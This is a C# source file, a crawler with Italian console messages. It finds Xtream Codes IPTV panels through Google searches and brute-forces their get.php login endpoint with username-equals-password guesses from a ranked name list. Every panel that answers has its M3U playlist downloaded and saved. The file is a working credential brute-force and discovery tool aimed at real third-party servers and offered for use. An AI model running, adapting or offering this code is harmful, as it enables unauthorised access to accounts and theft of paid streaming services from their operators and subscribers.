using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace MyTestCrawler
{
	class Program
	{
		static string plus = ""; //"_plus";
		static Dictionary<string, int> names;
		static void Main(string[] args)
		{
			MainAsync(args).ConfigureAwait(false).GetAwaiter().GetResult();
		}

		async static Task MainAsync(string[] args)
		{
			Console.Write("Caricamento nomi... ");
			await LoadNames();
			Console.WriteLine("[DONE] -> trovati " + names.Count + " nomi");
			Console.Write("Caricamento url... ");
			await LoadUrls();
			Console.WriteLine("[DONE] -> trovati " + listaUrl.Count + " url");
			Console.WriteLine("Inizio brute force...");
			ForcingUrls();
			Console.WriteLine("[DONE]");
		}
		static CancellationToken ct = new CancellationToken();
		private static void ForcingUrls()
		{
			Parallel.ForEach(listaUrl, new ParallelOptions
			{
				CancellationToken = ct,
				MaxDegreeOfParallelism = Environment.ProcessorCount + 1
			}, (source, state, ix) =>
			{
				Console.WriteLine("   > " + source);
				BruteForce(source, state, ix).Wait();
				Console.WriteLine("   > " + source + " [DONE]");
			});
		}

		static async Task LoadNames()
		{
			var files = Directory.EnumerateFiles(Path.Combine(Environment.CurrentDirectory, "nomi"), "tutti.lista", SearchOption.TopDirectoryOnly);
			var lst = new List<string>();
			foreach (var item in files)
			{
				var nomi = await File.ReadAllLinesAsync(item);
				lst = lst.Union(nomi).Distinct().ToList();
			}
			var dic = lst.Select(s => s.Split('\t')).Select(f => new KeyValuePair<string, int>(f[0], int.Parse(f.Length > 1 ? f[1] : "0")));
			names = dic.OrderByDescending(f => f.Value).ThenByDescending(f => f.Key).ToDictionary((f) => f.Key, (v) => v.Value);
		}

		static async Task BruteForce(KeyValuePair<string, int> url, ParallelLoopState state, long index)
		{
			Uri urlInfo = new Uri(url.Key);
			var outDir = Path.Combine(Environment.CurrentDirectory, "out", urlInfo.Host);
			HttpClient client = new HttpClient();
			client.DefaultRequestHeaders.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			var found = false;
			foreach (var user in names)
			{
				var fileName = Path.Combine(outDir, user.Key + ".m3u");
				try
				{
					var req = await client.GetAsync($"{url.Key}/get.php?username={user.Key}&password={user.Key}&type=m3u{plus}&output=mpegts");
					Console.WriteLine(("   > " + url.Key + " user " + user.Key).PadRight(70, '.') + req.StatusCode);
					if (req.StatusCode != System.Net.HttpStatusCode.OK)
					{
						break;
					}
					else
					{
#if DEBUG
						//Debugger.Break();
#endif
						var testo = await req.Content.ReadAsStringAsync();
						if (!string.IsNullOrWhiteSpace(testo))
						{
							found = true;
							if (!Directory.Exists(outDir)) Directory.CreateDirectory(outDir);
							Console.WriteLine("   > " + url.Key + " < trovata lista: " + fileName);
							names[user.Key] = user.Value + 1;
							var newl = names.Select(s => $"{s.Key}\t{s.Value}").ToList();
							await File.WriteAllTextAsync(fileName, testo);
							await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "nomi", "tutti.lista"), newl);
						}
					}
				}
				catch (HttpRequestException ex)
				{
				}
			}
			if (found)
			{
				listaUrl[url.Key] += 1;
			}
			else
			{
				listaUrl[url.Key] -= 1;
			}

			var newurl = listaUrl.Select(s => $"{s.Key}\t{s.Value}").ToList();
			await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"), newurl);

		}

		static Dictionary<string, int> listaUrl;

		async static Task LoadUrls()
		{
			var old = await File.ReadAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"));
			string[] urls = old.Select(f => f.TrimEnd('/')).ToArray();
#if RELEASE
			var x = 0;
			while (true)
			{
				HttpClient client = new HttpClient();
				var response = await client.GetAsync("https://www.google.it/search?q=%22Xtream+Codes+v1.0.60+Copyright%22&num=100&ei=kkb5WpLPCs_R5gKU_bOQCg&start=" + x + "&sa=N&filter=0&biw=1600&bih=779");
				var pageContents = await response.Content.ReadAsStringAsync();
				HtmlDocument pageDocument = new HtmlDocument();
				pageDocument.LoadHtml(pageContents);

				var headlineText = pageDocument.DocumentNode
					.SelectNodes("//div/ol")
					.Where(f => f != null && f.ParentNode != null && f.ParentNode.Id == "ires").ToList();
				if (headlineText.Count() == 0)
					break;

				var lines = headlineText.First()
					.SelectNodes("//h3/a")
					.Select(f => f.GetAttributeValue("href", "").Replace("/interstitial?url=", "").Replace("/url?q=", ""))
					.Where(f => f != "")
					.ToList()
					.Select(f =>
					{
						Uri uri;
						Uri.TryCreate(f, UriKind.RelativeOrAbsolute, out uri);
						return uri;
					})
					.Select(f => {
						if (f.IsAbsoluteUri)
							return f.OriginalString.Replace(f.PathAndQuery, "");
						else {
							return "";
						}
					})
					.Distinct()
					.ToList();

				if (lines.Count == 0) break;

				urls = urls.Union(lines).Distinct().ToArray();
				x += 100;
			}
#endif
			await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"), urls);

			listaUrl = urls.Distinct().Select(f => f.Split('\t'))
				.ToDictionary((f) => f[0], f => int.Parse(f.Length > 1 ? f[1] : "0"))
				.OrderByDescending(f => f.Value).ToDictionary((f) => f.Key, (v) => v.Value);

		}
	}
}
